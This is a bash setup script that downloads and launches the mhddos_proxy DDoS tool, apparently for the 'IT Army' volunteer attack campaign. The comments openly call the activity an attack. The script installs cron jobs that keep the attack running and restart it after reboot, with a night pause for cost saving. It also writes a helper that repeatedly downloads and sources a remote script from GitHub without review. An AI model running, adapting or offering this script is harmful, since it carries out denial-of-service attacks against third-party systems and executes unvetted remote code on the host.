#!/bin/bash

##### CHANGE LINES BELOW #####
TG_TOKEN="YOUR TELEGRAM TOKEN"      # Specify your TG token
TG_CHAT_ID="YOUR TELEGRAM CHAT ID"  # Specify your TG chat ID
NOTIFY_EVERY_HOUR=2                 # Notify every X hours
NIGHT_SILENCE=true                  # If 'true', disable attack between 1AM and 8AM MSK (for costs saving)
WGET_ARM64=false                    # If 'true', download for aarch64 (arm64) version
USER_ID=                            # User ID from bot "It Army Statistics"
##############################

if [ "$WGET_ARM64" = true ]; then
  wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux_arm64 -O mhddos_proxy_linux
else
  wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
fi

chmod +x mhddos_proxy_linux

cat > tg.sh <<EOF
#!/bin/bash
TG_TOKEN=$TG_TOKEN
TG_CHAT_ID=$TG_CHAT_ID
NIGHT_SILENCE=$NIGHT_SILENCE
# Download and execute the latest version of tg.sh file
tmpfile=\$(mktemp)
curl -Ls https://raw.githubusercontent.com/sumynik/mhddos_proxy-telegram/master/tg.sh > \$tmpfile
source \$tmpfile
rm \$tmpfile
EOF
chmod u+x tg.sh

cat > mhddos_start.sh <<EOF
#!/bin/bash
USER_ID=$USER_ID
# Run mhddos_proxy
if [ "$USER_ID" != "" ]; then
  $(pwd)/mhddos_proxy_linux --user-id $USER_ID --lang en > $(pwd)/mhddos.log 2>&1 &
else
  $(pwd)/mhddos_proxy_linux --lang en > $(pwd)/mhddos.log 2>&1 &
fi
EOF
chmod u+x mhddos_start.sh

# Run mhddos_proxy
./mhddos_start.sh

# Setup schedule of start, stop, and notifications
> cronjob
if [ "$NIGHT_SILENCE" = true ]; then
cat > cronjob <<EOF
# Shutdown the process at 22 UTC (1AM MSK) time
0 22 * * * /bin/bash $(pwd)/mhddos_stop.sh
# Turn on the process at 5 UTC (8AM MSK) time
0 5 * * * $(pwd)/mhddos_start.sh
# Send notifications every $NOTIFY_EVERY_HOUR hours
0 7-20/$NOTIFY_EVERY_HOUR * * * cd $(pwd) && /bin/bash tg.sh > tg.log 2>&1
# Restart the process every 2 hours
15 7-20/2 * * * /bin/bash $(pwd)/mhddos_stop.sh && $(pwd)/mhddos_start.sh
# Start the process automatically after reboot
@reboot $(pwd)/mhddos_start.sh
EOF
else
cat > cronjob <<EOF
# Send notifications every $NOTIFY_EVERY_HOUR hours
0 */$NOTIFY_EVERY_HOUR * * * cd $(pwd) && /bin/bash tg.sh > tg.log 2>&1
# Restart the process every 2 hours
15 */2 * * * /bin/bash $(pwd)/mhddos_stop.sh && $(pwd)/mhddos_start.sh
# Start the process automatically after reboot
@reboot $(pwd)/mhddos_start.sh
EOF
fi
crontab cronjob